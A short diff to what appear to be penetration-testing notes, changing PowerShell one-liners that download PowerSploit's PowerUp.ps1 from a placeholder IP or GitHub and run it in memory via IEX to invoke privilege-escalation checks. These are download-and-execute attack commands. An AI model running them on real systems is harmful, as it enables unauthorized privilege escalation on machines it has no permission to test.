@@ -35,11 +35,11 @@ This works quite well:
 PowerUp.ps1
 
 ```bash
-(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/PowerUp.ps1') | IEX; Invoke-HostRecon
+(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/PowerUp.ps1') | IEX; Invoke-AllChecks
 ```
 
 ```bash
-(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1') | IEX; Invoke-HostRecon
+(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1') | IEX; Invoke-AllChecks
 ```
 
 HostRecon.ps1
